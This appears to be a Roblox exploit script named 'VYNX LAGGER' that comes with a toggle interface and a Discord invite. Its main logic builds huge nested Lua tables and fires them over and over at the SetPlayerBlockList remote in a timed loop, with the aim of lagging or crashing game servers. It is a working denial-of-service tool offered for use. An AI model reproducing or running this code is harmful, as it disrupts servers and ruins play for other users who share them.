local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled

-- ==================== LAGGER LOGIC (EXACT FROM SECOND SCRIPT) ====================
local cfg = {
    x = 2.5,
    y = 1,
    z = 0.15
}

local remoteStuff = "RobloxReplicatedStorage.SetPlayerBlockList"

local function getRemote(road)
    if not road or road == "" then
        return nil
    end
    local obj = game
    local clean = road:gsub("^game%.", "")
    for piece in clean:gmatch("[^%.]+") do
        if obj then
            obj = obj[piece]
        else
            return nil
        end
    end
    return obj
end

local function doSpam(inc, attempts)
    local mainTable = {}
    local spamTable = {}
    table.insert(spamTable, {})
    local ptr = spamTable[1]
    for i = 1, inc do
        local newTable = {}
        table.insert(ptr, newTable)
        ptr = newTable
    end
    for i = 1, 15000 do
        table.insert(mainTable, spamTable)
        if i % 1000 == 0 then
            task.wait()
        end
    end

    local remoteObj = getRemote(remoteStuff)
    if remoteObj then
        for i = 1, attempts do
            pcall(function()
                if remoteObj:IsA("RemoteEvent") or remoteObj:IsA("UnreliableRemoteEvent") then
                    remoteObj:FireServer(mainTable)
                elseif remoteObj:IsA("RemoteFunction") then
                    remoteObj:InvokeServer(mainTable)
                end
            end)
        end
    end
end

local active = false
local laggerThread = nil

local function runLoop()
    while active do
        task.spawn(function()
            doSpam(cfg.x, cfg.y)
        end)
        task.wait(cfg.z)
    end
end

local function stopLagger()
    active = false
    if laggerThread then
        coroutine.close(laggerThread)
        laggerThread = nil
    end
end

local function startLagger()
    if laggerThread then return end
    active = true
    laggerThread = coroutine.create(runLoop)
    coroutine.resume(laggerThread)
end

-- Workspace optimization
for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Texture") or v:IsA("Decal") then
        v:Destroy()
    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
        v.Material = Enum.Material.SmoothPlastic
    end
end
-- ==================== END LAGGER LOGIC ====================

-- ==================== UI (FROM FIRST SCRIPT) ====================
local toggleKey = Enum.KeyCode.V

-- Root
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Lagger404V2"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = game.CoreGui

-- Main Frame
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.new(0, 220, 0, 82)
Main.Position = UDim2.new(0, 20, 0, 20)
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BackgroundTransparency = 0
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true
Main.Parent = ScreenGui

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 10)

-- Title: "VYNX LAGGER"
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(0, 120, 0, 22)
Title.Position = UDim2.new(0, 10, 0, 5)
Title.BackgroundTransparency = 1
Title.Text = "VYNX LAGGER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 13
Title.Font = Enum.Font.Code
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Main

-- Discord link
local Discord = Instance.new("TextLabel")
Discord.Size = UDim2.new(0, 90, 0, 22)
Discord.Position = UDim2.new(1, -100, 0, 5)
Discord.BackgroundTransparency = 1
Discord.Text = ".gg/dEGxgk2Wht"
Discord.TextColor3 = Color3.fromRGB(255, 255, 255)
Discord.TextSize = 12
Discord.Font = Enum.Font.Code
Discord.TextXAlignment = Enum.TextXAlignment.Right
Discord.Parent = Main

-- Toggle row background (all black)
local ToggleRow = Instance.new("Frame")
ToggleRow.Size = UDim2.new(1, -14, 0, 32)
ToggleRow.Position = UDim2.new(0, 7, 0, 32)
ToggleRow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ToggleRow.BorderSizePixel = 0
ToggleRow.Parent = Main

local ToggleRowCorner = Instance.new("UICorner", ToggleRow)
ToggleRowCorner.CornerRadius = UDim.new(0, 7)

-- Status label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -60, 1, 0)
StatusLabel.Position = UDim2.new(0, 0, 0, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "INACTIVE"
StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 185)
StatusLabel.TextSize = 10
StatusLabel.Font = Enum.Font.Code
StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
StatusLabel.Parent = ToggleRow

-- Toggle pill background (lighter to stand out)
local PillBg = Instance.new("Frame")
PillBg.Size = UDim2.new(0, 40, 0, 20)
PillBg.Position = UDim2.new(1, -46, 0.5, -10)
PillBg.BackgroundColor3 = Color3.fromRGB(70, 70, 78)
PillBg.BorderSizePixel = 0
PillBg.Parent = ToggleRow

local PillCorner = Instance.new("UICorner", PillBg)
PillCorner.CornerRadius = UDim.new(1, 0)

-- Toggle dot (bright white circle)
local Dot = Instance.new("Frame")
Dot.Size = UDim2.new(0, 14, 0, 14)
Dot.Position = UDim2.new(0, 3, 0.5, -7)
Dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dot.BorderSizePixel = 0
Dot.Parent = PillBg

local DotCorner = Instance.new("UICorner", Dot)
DotCorner.CornerRadius = UDim.new(1, 0)

-- Invisible hit button over pill
local PillHit = Instance.new("TextButton")
PillHit.Size = UDim2.new(1, 0, 1, 0)
PillHit.BackgroundTransparency = 1
PillHit.Text = ""
PillHit.Parent = PillBg

-- Also allow clicking the row
local RowHit = Instance.new("TextButton")
RowHit.Size = UDim2.new(1, 0, 1, 0)
RowHit.BackgroundTransparency = 1
RowHit.Text = ""
RowHit.Parent = ToggleRow

local function setLagger(state)
    active = state
    local tw = TweenInfo.new(0.18, Enum.EasingStyle.Quad)
    if active then
        TweenService:Create(PillBg, tw, {BackgroundColor3 = Color3.fromRGB(230, 230, 235)}):Play()
        TweenService:Create(Dot, tw, {
            Position = UDim2.new(0, 23, 0.5, -7),
            BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
        StatusLabel.Text = "ACTIVE"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        startLagger()
    else
        TweenService:Create(PillBg, tw, {BackgroundColor3 = Color3.fromRGB(70, 70, 78)}):Play()
        TweenService:Create(Dot, tw, {
            Position = UDim2.new(0, 3, 0.5, -7),
            BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        }):Play()
        StatusLabel.Text = "INACTIVE"
        StatusLabel.TextColor3 = Color3.fromRGB(180, 180, 185)
        stopLagger()
    end
end

PillHit.MouseButton1Click:Connect(function()
    setLagger(not active)
end)

RowHit.MouseButton1Click:Connect(function()
    setLagger(not active)
end)

-- Keybind input
UserInputService.InputBegan:Connect(function(input, gpe)
    if input.KeyCode == toggleKey and not gpe then
        setLagger(not active)
    end
end)
